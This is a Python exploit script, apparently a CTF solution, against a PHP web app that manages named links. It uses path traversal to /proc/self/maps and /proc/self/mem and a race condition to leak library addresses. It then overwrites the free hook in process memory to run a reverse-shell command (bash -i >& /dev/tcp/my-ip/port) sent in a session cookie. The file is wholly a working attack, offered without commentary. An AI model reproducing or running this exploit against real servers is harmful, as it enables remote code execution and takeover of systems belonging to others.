import requests
import threading
import time
import concurrent.futures
import struct

payload="a/b"
cookies = {
    "PHPSESSID": payload
}
sess = requests.Session()
HOST = 'http://172.18.253.48/'
HOST = 'http://any.ctf.zer0pts.com:9082/'

def main():
    # cleanup
    for name in 'abc':
        r = sess.post(
            HOST,
            cookies=cookies,
            data={
                "mode": "delete",
                "name": name,
            }
        )

    r = sess.post(
        HOST,
        cookies=cookies,
        data={
            "mode": "create",
            "name": "b",
            "target": "",
        }
    )

    r = sess.post(
        HOST,
        cookies=cookies,
        data={
            "mode": "create",
            "name": "c",
            "type": "1",
            "target": "b",
        }
    )

def clean(target='b'):
    for t in target:
        r = sess.post(HOST, cookies=cookies, data={
            'mode': 'delete',
            'name': t,
        })

def map():
    r = sess.post(HOST, cookies=cookies, data={
        'mode': 'read',
        'name': 'b'
        })
    return r

def map2():
    clean()
    r = sess.post(
        HOST,
        cookies=cookies,
        data={
            "mode": "create",
            "name": "c",
            "type": "1",
            "target": "/../../../../../proc/self/maps",
        }
    )

def read():
    clean()
    r = requests.post(
        HOST,
        cookies=cookies,
        data={
            "mode": "create",
            "name": "c",
            "type": "1",
            "target": "/../../../../../proc/self/exe",
        }
    )

    exe = concurrent.futures.ProcessPoolExecutor(2)

    t = exe.submit(map)
    time.sleep(0.2)
    t2 = exe.submit(map2)

    data = t.result().text.split('card-text">')[1]
    data = data.split('</p>')[0]
    data = data.replace('<br />', '')
    print(data)

    for x in data.split('\n'):
        x = x.strip()
        if not x:
            continue
        if '/lib' in x:
            lib = x[x.index('/lib'):]
            name = lib.split('/')[-1]
            if name not in bases:
                bases[name] = int(x.split('-')[0], 16)
                print(hex(bases[name]), lib)

    clean('bc')

def write():
    clean()
    sess.post(
        HOST,
        cookies=cookies,
        data={
            "mode": "create",
            "name": "c",
            "type": "1",
            "target": "/../../../../../proc/self/mem",
        })

    def write(addr, data):
        sess.post(
            HOST,
            cookies=cookies,
            data={
            "mode": "write",
            "name": "b",
            "offset": addr,
            "data": data
            })

    free_hook = bases['libphp7.so'] + 0xd53218
    write(free_hook, struct.pack("<Q", bases['libc-2.28.so'] + 0x449C0))
    payload="bash -c 'bash -i >& /dev/tcp/my-ip/port 0>&1'"
    cookies['PHPSESSID']=payload
    for i in range(8):
        r = requests.post(
            HOST,
            cookies=cookies,
            data={
                "mode": "create",
                "name": "eyo",
                "type": "1",
                "target": "",
            })
        print(r.text)
    write(free_hook, struct.pack("<Q", bases['libphp7.so'] + 0x11f436))


if __name__ == '__main__':
    bases = {}
    main()
    read()

    cookies["PHPSESSID"] = "b4c433157e39d8f61e75e3f8150746a0"
    main()
    write()
